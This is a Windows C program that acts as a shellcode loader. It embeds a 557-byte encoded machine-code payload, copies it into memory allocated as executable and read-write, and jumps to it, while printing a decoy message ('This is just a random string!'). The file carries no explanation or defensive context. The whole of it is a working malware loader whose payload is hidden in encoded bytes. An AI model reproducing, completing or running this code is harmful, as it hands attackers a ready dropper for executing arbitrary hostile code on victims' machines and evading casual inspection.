#include <stdio.h>
#include <windows.h>

unsigned const char payload[] = "\xdb\xc2\xb8\x52\xb4\x95\x76\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x85\x31\x42\x19\x03\x42\x19\x83\xc2\x04\xb0\x41\x28\x7f\xdd"
"\x5d\x8f\x5b\xc3\x7b\x44\x78\x0f\x24\x96\x49\x5e\xa5\x5b\xa6"
"\x5c\x6b\x33\x28\x9f\xe3\xda\xa8\x63\xc9\xee\x48\x72\x84\x7e"
"\xd4\x48\x9e\x2e\x44\xe5\xad\x48\x82\x34\xfe\x22\x5c\xc6\xeb"
"\x62\x4f\x80\xf0\x13\x5e\x6b\x6d\x4e\x78\xb6\x4b\x0f\x56\x49"
"\xea\x58\x7d\x99\x61\x51\xc3\xd9\xa9\x15\xa4\xd4\xa9\x20\xa4"
"\xb6\x4f\x9f\x50\xf6\x92\xe9\xaf\xda\x11\x15\x95\x98\x20\x35"
"\x0f\x97\x45\xb8\xc7\x0c\x7d\x0b\x0f\xe6\xfe\x72\x02\x71\x99"
"\x20\x02\xba\x60\x39\x7b\x6f\x59\x8a\xb4\xff\x9c\x11\x2b\xe3"
"\xef\x93\x2e\xd3\x64\xf3\x37\x9f\xfa\xc0\x45\x94\xa6\xcc\x9a"
"\xbc\x12\x32\x60\xd5\xda\x61\xa3\x5c\xd0\x1e\xe8\xf3\x3d\x41"
"\x6c\x26\xd3\x2d\xed\xa7\x99\x4f\x75\x9b\x0e\x97\xd2\x70\x35"
"\x86\x0f\x14\x52\x38\xd6\x38\x33\xa5\x3f\x32\xb1\xcd\x63\x02"
"\xda\xdd\x87\x94\xde\x45\x0b\x35\x2e\xcf\xb9\x3d\xc2\x93\x2b"
"\x5f\x19\x64\xcc\xe0\x1e\x12\xf6\x10\xc7\x48\x55\x83\xbb\x4a"
"\xac\x9f\x0b\x7f\x6b\x01\x87\x21\xa6\x49\x2f\x11\xcb\xaa\xf5"
"\x6e\x80\xae\xf3\x6e\x19\xe1\x77\x61\xcf\xcd\xc9\xd4\x2d\xe1"
"\xc3\x42\x96\x4d\xb9\x0f\x71\xe4\xd8\xb8\x6b\x64\xe2\x86\x84"
"\xff\x34\x9f\x43\x40\xcf\xae\xac\x5e\x7c\x2f\x6f\x7a\x9a\x4f"
"\x2a\x19\xf4\xef\x9b\xf6\xc1\xcd\x61\x69\xb1\xcf\x63\x4c\x50"
"\xdf\x9d\x1e\x2c\xd2\xa6\x42\x58\x95\x63\x9e\xba\x79\x6d\xf8"
"\xb8\xea\x56\x28\x59\xc3\xa5\x69\xe9\x92\x58\x7f\x1e\xc8\x5b"
"\x89\x8e\xc4\x5f\x48\x7d\x67\xe7\xca\x96\x91\x68\x78\x05\xd7"
"\x54\x9c\x05\x98\x27\x0e\x1a\x93\xba\x88\xd7\x81\x5d\x07\x91"
"\x6a\x6a\xd7\x92\x17\xd2\x96\x3f\x05\x6a\xb9\x22\xd1\xa9\x3a"
"\x8e\xa3\x8c\xf2\x74\x8a\xa7\xde\x64\x18\x87\x9d\x9b\xfb\x2d"
"\x51\x2d\xae\x57\x5d\xc7\x65\xb1\xef\x34\x90\xb9\x90\xb6\x2f"
"\xc6\x16\xbc\x53\xc3\xed\x70\x44\xfa\xc9\x36\xe4\x7e\xbd\x85"
"\x32\x8a\xbe\x77\x45\xa6\xd5\x35\xd7\xa1\xb3\xea\x97\xb8\xbb"
"\xe0\xc4\xf0\x2c\x4b\xb2\x24\x4e\x26\xbe\x5b\xf9\x4c\x37\xbb"
"\x2d\x25\x38\x92\xe6\x88\xbf\x57\x81\x20\xea\xb1\xf2\xfc\xde"
"\xb0\x2a\xff\x05\xd5\xf4\x88\x66\xb3\x28\x7b\x3f\xbd\x04\x24"
"\xa0\x05\x59\x0d\x95\x57\xd8\xbd\xe0\x69\x6d\x41\x44\x0e\x30"
"\x76\x7a\xad\x12\x3c\x8e\x18\xd2\x73\x23\xf8\x09\xf2\xb8\xc7"
"\x04\x28\xbc\x3a\x22\xd8\xd1\xe6\x17\xdf\xb1\x1c\xea\x0c\xbd"
"\xd9\xf5\x66\x7a\x75\x67\xe4\x25\xdf\x97\x9a\x1e\x30\x17\xcc"
"\x0a\xb0";

size_t size = 557;

int main(int argc, char** argv) {

    char* code;

    printf("This is just a random string!\n");

    code = (char*)VirtualAlloc(NULL, size, MEM_COMMIT,PAGE_EXECUTE_READWRITE);

    memcpy(code, payload, size); 

    ((void(*)())code)();

    return(0);
}
